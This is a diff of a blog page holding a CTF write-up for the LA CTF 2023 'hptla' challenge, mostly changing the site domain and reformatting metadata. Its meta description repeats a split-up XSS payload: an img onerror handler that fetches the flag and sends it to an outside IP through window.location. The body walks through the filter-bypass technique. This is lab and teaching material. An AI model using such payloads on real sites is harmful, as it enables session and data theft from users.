@@ -5,73 +5,33 @@
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="noodp" />
-    <title>hptla - LA CTF 2023 - My Blog</title><meta name="Description" content="Don&#39;t book a cover by it&#39;s judge"><meta property="og:title" content="hptla - LA CTF 2023" />
-<meta property="og:description" content="
-    tl;dr
-We can join the two lines either by adding a ` or starting a comment /* at the end of one line and closing it *\ at the start of the next line
-We have to split the payload into 20 parts like that
+    <title>hptla - LA CTF 2023 - My Blog</title><meta name="Description" content="Don&#39;t book a cover by it&#39;s judge"><meta property="og:url" content="http://lu513n.com/blog/posts/hptla/">
+  <meta property="og:site_name" content="My Blog">
+  <meta property="og:title" content="hptla - LA CTF 2023">
+  <meta property="og:description" content=" tl;dr We can join the two lines either by adding a ` or starting a comment /* at the end of one line and closing it *\ at the start of the next line We have to split the payload into 20 parts like that Final payload
+&lt;img src=&#39; &#39;onerror=&#39;` `;n=fetch;` `;l=r=&gt;{` `;return/* */r.text();` `;};` `;p=q=&gt;{s=/* */`http:`;` `;s&#43;=`//3`;` `;s&#43;=`4.9`;` `;s&#43;=`3.5`;` `;window./* */location/* */=s&#43;`6.144? `&#43;q;};` `;f=`flag`;` `;w=n(f)/* */.then(l)/* */.then(p);&#39; ">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-02-15T00:00:00+05:30">
+    <meta property="article:modified_time" content="2023-02-15T00:00:00+05:30">
+    <meta property="article:tag" content="Web">
+    <meta property="article:tag" content="Lactf23-Writeups">
+    <meta property="article:tag" content="Ctf">
+    <meta property="article:tag" content="Writeup">
+    <meta property="article:tag" content="Xss">
 
-Final payload
-&lt;img src=&#39;
-&#39;onerror=&#39;`
-`;n=fetch;`
-`;l=r=&gt;{`
-`;return/*
-*/r.text();`
-`;};`
-`;p=q=&gt;{s=/*
-*/`http:`;`
-`;s&#43;=`//3`;`
-`;s&#43;=`4.9`;`
-`;s&#43;=`3.5`;`
-`;window./*
-*/location/*
-*/=s&#43;`6.144?
-`&#43;q;};`
-`;f=`flag`;`
-`;w=n(f)/*
-*/.then(l)/*
-*/.then(p);&#39;
-" />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="http://r0h1t.me/blog/posts/hptla/" /><meta property="article:section" content="posts" />
-<meta property="article:published_time" content="2023-02-15T00:00:00+05:30" />
-<meta property="article:modified_time" content="2023-02-15T00:00:00+05:30" />
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="hptla - LA CTF 2023"/>
-<meta name="twitter:description" content="
-    tl;dr
-We can join the two lines either by adding a ` or starting a comment /* at the end of one line and closing it *\ at the start of the next line
-We have to split the payload into 20 parts like that
-
-Final payload
-&lt;img src=&#39;
-&#39;onerror=&#39;`
-`;n=fetch;`
-`;l=r=&gt;{`
-`;return/*
-*/r.text();`
-`;};`
-`;p=q=&gt;{s=/*
-*/`http:`;`
-`;s&#43;=`//3`;`
-`;s&#43;=`4.9`;`
-`;s&#43;=`3.5`;`
-`;window./*
-*/location/*
-*/=s&#43;`6.144?
-`&#43;q;};`
-`;f=`flag`;`
-`;w=n(f)/*
-*/.then(l)/*
-*/.then(p);&#39;
-"/>
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="hptla - LA CTF 2023">
+  <meta name="twitter:description" content=" tl;dr We can join the two lines either by adding a ` or starting a comment /* at the end of one line and closing it *\ at the start of the next line We have to split the payload into 20 parts like that Final payload
+&lt;img src=&#39; &#39;onerror=&#39;` `;n=fetch;` `;l=r=&gt;{` `;return/* */r.text();` `;};` `;p=q=&gt;{s=/* */`http:`;` `;s&#43;=`//3`;` `;s&#43;=`4.9`;` `;s&#43;=`3.5`;` `;window./* */location/* */=s&#43;`6.144? `&#43;q;};` `;f=`flag`;` `;w=n(f)/* */.then(l)/* */.then(p);&#39; ">
+      <meta name="twitter:site" content="@Lu513n">
 <meta name="application-name" content="My Blog">
 <meta name="apple-mobile-web-app-title" content="My Blog">
 
 <meta name="theme-color" content="#f8f8f8"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://r0h1t.me/blog/posts/hptla/" /><link rel="prev" href="http://r0h1t.me/blog/posts/queue-up/" /><link rel="stylesheet" href="/blog/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/blog/css/color.css"><link rel="stylesheet" href="/blog/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/blog/lib/fontawesome-free/all.min.css">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="canonical" href="http://lu513n.com/blog/posts/hptla/" /><link rel="prev" href="http://lu513n.com/blog/posts/queue-up/" /><link rel="stylesheet" href="/blog/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/blog/css/color.css"><link rel="stylesheet" href="/blog/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/blog/lib/fontawesome-free/all.min.css">
         <noscript><link rel="stylesheet" href="/blog/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/blog/lib/animate/animate.min.css">
         <noscript><link rel="stylesheet" href="/blog/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
     {
@@ -81,9 +41,9 @@ Final payload
         "inLanguage": "en",
         "mainEntityOfPage": {
             "@type": "WebPage",
-            "@id": "http:\/\/r0h1t.me\/blog\/posts\/hptla\/"
+            "@id": "http:\/\/lu513n.com\/blog\/posts\/hptla\/"
         },"genre": "posts","keywords": "web, lactf23-writeups, ctf, writeup, xss","wordcount":  1063 ,
-        "url": "http:\/\/r0h1t.me\/blog\/posts\/hptla\/","datePublished": "2023-02-15T00:00:00+05:30","dateModified": "2023-02-15T00:00:00+05:30","publisher": {
+        "url": "http:\/\/lu513n.com\/blog\/posts\/hptla\/","datePublished": "2023-02-15T00:00:00+05:30","dateModified": "2023-02-15T00:00:00+05:30","publisher": {
             "@type": "Organization",
             "name": "Rohit"},"authors": [{
                         "@type": "Person",
@@ -102,16 +62,7 @@ Final payload
         getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
     </script>
     <div id="back-to-top"></div>
-    <div id="mask"></div><div class="wrapper">
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-L6TEV86QF7"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-L6TEV86QF7');
-</script>
-<header class="desktop" id="header-desktop">
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
     <div class="header-wrapper">
         <div class="header-title">
             <a href="/blog/" title="My Blog">My Blog</a>
@@ -173,8 +124,8 @@ Final payload
 <main class="main">
             <div class="container"><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">hptla - LA CTF 2023</h1><div class="post-meta">
             <div class="post-meta-line">
-                <span class="post-author"><span class='author'><i class="author fas fa-user-circle fa-fw"></i><span class='screen-reader-text'>  </span><a href='http://r0h1t.me/blog/authors/rohit'>Rohit</a></span>
-                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/blog/categories/lactf23-writeups/"><i class="far fa-folder fa-fw"></i>lactf23-writeups</a>&nbsp;<a href="/blog/categories/all-writeups/"><i class="far fa-folder fa-fw"></i>All Writeups</a></span></div>
+                <span class="post-author"><span class='author'><i class="author fas fa-user-circle fa-fw"></i><span class='screen-reader-text'>  </span><a href='http://lu513n.com/blog/authors/rohit'>Rohit</a></span>
+                </span>&nbsp;<span class="post-category">included in </span>&nbsp;<span class="post-category">categories <a href="/blog/categories/lactf23-writeups/"><i class="far fa-folder fa-fw"></i>Lactf23-Writeups</a>&nbsp;<a href="/blog/categories/all-writeups/"><i class="far fa-folder fa-fw"></i>All Writeups</a></span></div>
             <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2023-02-15">2023-02-15</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2023-02-15">2023-02-15</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1063 words&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;<span id="/blog/posts/hptla/" class="leancloud_visitors" data-flag-title="hptla - LA CTF 2023">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class="leancloud-visitors-count waline-pageview-count" data-path="/blog/posts/hptla/"></span>&nbsp;views
@@ -337,14 +288,14 @@ Final payload
     <a href="#joining-the-todos" class="header-mark"></a>Joining the todos</h3><p>So the first thing we have to do is to get rid of the things in between each todo.</p>
 <p>We can start the first todo as <code>&lt;img src='</code> then the next with <code>' onload='</code>. Here we open <code>'</code> on the first todo and close it in the second one. So everything in between will come in the <code>src</code> attribute. Now for the 3rd todo onwards we can give the js payload. But we can&rsquo;t anymore use <code>'</code> to join as it will close off the <code>onload</code> attribute.</p>
 <p>So we went with `, we can put anything in between `. So we have to put one ` at the end of every todo and `; at the start of every todo to close it.</p>
-<p><a class="lightgallery" href="images/backticks.png" title="backticks" data-thumbnail="images/backticks.png">
+<p><a class="lightgallery" href="/blog/posts/hptla/images/backticks.png" title="backticks" data-thumbnail="/blog/posts/hptla/images/backticks.png">
         <img
             
             loading="lazy"
             src="images/backticks.png"
-            srcset="images/backticks.png, images/backticks.png 1.5x, images/backticks.png 2x"
+            srcset="/blog/posts/hptla/images/backticks.png, images/backticks.png 1.5x, /blog/posts/hptla/images/backticks.png 2x"
             sizes="auto"
-            alt="images/backticks.png">
+            alt="/blog/posts/hptla/images/backticks.png">
     </a></p>
 <h3 id="getting-the-flag" class="headerLink">
     <a href="#getting-the-flag" class="header-mark"></a>Getting the flag</h3><p>Now we need to find a way to get the flag and send it to our server and make it short. Our first thought was to use <code>window.open</code> we can just call that using <code>open()</code>
@@ -355,28 +306,28 @@ The first 2 characters needed to be `; and the last 2 characters needed to be ;`
 </span></span></span><span class="line"><span class="cl"><span class="s1">`;f=&#34;flag&#34;;`
 </span></span></span><span class="line"><span class="cl"><span class="s1">`;w=o(f);&#39;</span>
 </span></span></code></pre></div><p>But that failed and give us this error <a href="https://mtsknn.fi/blog/illegal-invocations-in-js/" target="_blank" rel="noopener noreferrer">Illegal Invocation</a></p>
-<p><a class="lightgallery" href="images/firsterror.png" title="firsterror" data-thumbnail="images/firsterror.png">
+<p><a class="lightgallery" href="/blog/posts/hptla/images/firsterror.png" title="firsterror" data-thumbnail="/blog/posts/hptla/images/firsterror.png">
         <img
             
             loading="lazy"
             src="images/firsterror.png"
-            srcset="images/firsterror.png, images/firsterror.png 1.5x, images/firsterror.png 2x"
+            srcset="/blog/posts/hptla/images/firsterror.png, images/firsterror.png 1.5x, /blog/posts/hptla/images/firsterror.png 2x"
             sizes="auto"
-            alt="images/firsterror.png">
+            alt="/blog/posts/hptla/images/firsterror.png">
     </a></p>
 <p>So we had to use <code>fetch</code>. The main reason why we didn&rsquo;t use <code>fetch</code> in the first place was that it needed either <code>await</code> if we are storing it into a variable or <code>.then()</code> otherwise. Both of them not fitting inside the 12 characters. Now we have to bypass this somehow</p>
 <h3 id="javascript-comments" class="headerLink">
     <a href="#javascript-comments" class="header-mark"></a>Javascript comments</h3><p>We thought <code>backticks</code> was the only way to join queries at first. But then my teammates suggested the idea of using comments <code>/**/</code>. Comments are also more efficient than using ` as we don&rsquo;t need to make each todo as separate lines of code now. We also can separate <code>fetch</code> and <code>.then()</code> by putting comments in between.</p>
-<p><a class="lightgallery" href="images/comments.png" title="comments" data-thumbnail="images/comments.png">
+<p><a class="lightgallery" href="/blog/posts/hptla/images/comments.png" title="comments" data-thumbnail="/blog/posts/hptla/images/comments.png">
         <img
             
             loading="lazy"
             src="images/comments.png"
-            srcset="images/comments.png, images/comments.png 1.5x, images/comments.png 2x"
+            srcset="/blog/posts/hptla/images/comments.png, images/comments.png 1.5x, /blog/posts/hptla/images/comments.png 2x"
             sizes="auto"
-            alt="images/comments.png">
+            alt="/blog/posts/hptla/images/comments.png">
     </a></p>
-<p><strong>Average Javascript moment</strong> 😎</p>
+<p><strong>Average Javascript moment</strong> &#x1f60e;</p>
 <p>Also, we can use comments to separate <code>window</code> and <code>.location</code></p>
 <h3 id="javascript-functions" class="headerLink">
     <a href="#javascript-functions" class="header-mark"></a>Javascript functions</h3><p>Now that we can use <code>.then()</code> we need a function to pass to it. So that&rsquo;s where javascript&rsquo;s arrow functions come to the rescue. We can use that to create 2 functions. We need one to return the <code>r.text()</code> and another one to send the flag to our IP.</p>
@@ -434,13 +385,13 @@ The first 2 characters needed to be `; and the last 2 characters needed to be ;`
         <div class="post-info-line">
             <div class="post-info-md"></div>
             <div class="post-info-share">
-                <span><a href="#" title="Share on Twitter" data-sharer="twitter" data-url="http://r0h1t.me/blog/posts/hptla/" data-title="hptla - LA CTF 2023" data-via="Lu513n" data-hashtags="web,lactf23-writeups,ctf,writeup,xss"><i class="fab fa-twitter fa-fw"></i></a><a href="#" title="Share on Facebook" data-sharer="facebook" data-url="http://r0h1t.me/blog/posts/hptla/" data-hashtag="web"><i class="fab fa-facebook-square fa-fw"></i></a><a href="#" title="Share on Linkedin" data-sharer="linkedin" data-url="http://r0h1t.me/blog/posts/hptla/"><i class="fab fa-linkedin fa-fw"></i></a><a href="#" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://r0h1t.me/blog/posts/hptla/" data-title="hptla - LA CTF 2023" data-web><i class="fab fa-whatsapp fa-fw"></i></a></span>
+                <span><a href="#" title="Share on Twitter" data-sharer="twitter" data-url="http://lu513n.com/blog/posts/hptla/" data-title="hptla - LA CTF 2023" data-via="Lu513n" data-hashtags="web,lactf23-writeups,ctf,writeup,xss"><i class="fab fa-twitter fa-fw"></i></a><a href="#" title="Share on Facebook" data-sharer="facebook" data-url="http://lu513n.com/blog/posts/hptla/" data-hashtag="web"><i class="fab fa-facebook-square fa-fw"></i></a><a href="#" title="Share on Linkedin" data-sharer="linkedin" data-url="http://lu513n.com/blog/posts/hptla/"><i class="fab fa-linkedin fa-fw"></i></a><a href="#" title="Share on WhatsApp" data-sharer="whatsapp" data-url="http://lu513n.com/blog/posts/hptla/" data-title="hptla - LA CTF 2023" data-web><i class="fab fa-whatsapp fa-fw"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/blog/tags/web/">web</a>,&nbsp;<a href="/blog/tags/lactf23-writeups/">lactf23-writeups</a>,&nbsp;<a href="/blog/tags/ctf/">ctf</a>,&nbsp;<a href="/blog/tags/writeup/">writeup</a>,&nbsp;<a href="/blog/tags/xss/">xss</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/blog/tags/web/">Web</a>,&nbsp;<a href="/blog/tags/lactf23-writeups/">Lactf23-Writeups</a>,&nbsp;<a href="/blog/tags/ctf/">Ctf</a>,&nbsp;<a href="/blog/tags/writeup/">Writeup</a>,&nbsp;<a href="/blog/tags/xss/">Xss</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/blog/">Home</a></span>
         </section>
@@ -452,7 +403,7 @@ The first 2 characters needed to be `; and the last 2 characters needed to be ;`
                 Please enable JavaScript to view the comments powered by <a href="https://waline.js.org/">Waline</a>.
             </noscript></div></article></div>
         </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://r0h1t.me/" target="_blank" rel="noopener noreferrer">Rohit</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="http://r0h1t.me/" target="_blank" rel="noopener noreferrer">Rohit</a></span></div>
             <div class="footer-line"></div>
             <div class="footer-line">
             </div>
